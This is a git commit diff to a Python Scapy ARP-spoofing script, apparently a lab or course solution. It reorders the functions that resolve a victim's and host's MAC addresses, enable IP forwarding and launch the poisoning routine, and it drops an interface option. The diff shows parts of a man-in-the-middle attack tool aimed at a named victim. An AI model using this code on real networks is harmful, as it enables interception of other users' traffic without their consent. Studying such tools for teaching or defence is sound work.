05e7f0184c259b9c15f62b0847da3405bcb40476
Cameron Betz <cameronleebetz@gmail.com>
2018-10-22 11:47:00 -0600

    edited solution

--- arpSpoof/arpSpoofScapy.py
+++ arpSpoof/arpSpoofScapy.py
@@ -7,29 +7,17 @@ TIMEOUT = 3
 RETRY = 12
 IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
 
-def configuration():
-    parser = ArgumentParser()
+def IPtoMAConvert(ip, retry=RETRY, timeout=TIMEOUT):
+    arp = ARP()
+    arp.op = 1
+    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
+    arp.pdst = ip
+    response, unanswered = sr(arp, retry=retry, timeout=timeout)
 
-    parser.add_argument('-t', dest='victim', required=True, type=str, help='The victim\'s IP address')
-    parser.add_argument('-r',  dest='host', required=True, type=str, help='The host\'s IP address')
-    parser.add_argument('-i',  dest='interface', required=True, type=str, help='Use this network interface')
+    for s,r in response:
+        return r[ARP].underlayer.src
 
-    args = parser.parse_args()
-
-    return {
-        'victim' :  {
-
-            'ip' : args.victim,
-            'mac' : IPtoMAConvert(args.victim),
-        },
-
-        'host' :  {
-            'ip' : args.host,
-            'mac' : IPtoMAConvert(args.host),
-        },
-
-        'iface' : args.interface,
-    }
+    return None
 
 def poisonExecute(configs):
     victimMac = configs['victimMac']
@@ -71,22 +59,31 @@ def poisonExecute(configs):
 
     print('done!')
 
-def IPtoMAConvert(ip, retry=RETRY, timeout=TIMEOUT):
-    arp = ARP()
-    arp.op = 1
-    arp.hwdst = 'ff:ff:ff:ff:ff:ff'
-    arp.pdst = ip
-    response, unanswered = sr(arp, retry=retry, timeout=timeout)
-
-    for s,r in response:
-        return r[ARP].underlayer.src
-
-    return None
-
 def poison(configs):
     with open(IP_FORWARD, 'w') as fd:
         fd.write('1')
     poisonExecute(configs)
+
+def configuration():
+    parser = ArgumentParser()
+
+    parser.add_argument('-t', dest='victim', required=True, type=str, help='The victim\'s IP address')
+    parser.add_argument('-r',  dest='host', required=True, type=str, help='The host\'s IP address')
+
+    args = parser.parse_args()
+
+    return {
+        'victim' :  {
+
+            'ip' : args.victim,
+            'mac' : IPtoMAConvert(args.victim),
+        },
+
+        'host' :  {
+            'ip' : args.host,
+            'mac' : IPtoMAConvert(args.host),
+        }
+    }
 
 def main():
     configs = configuration()
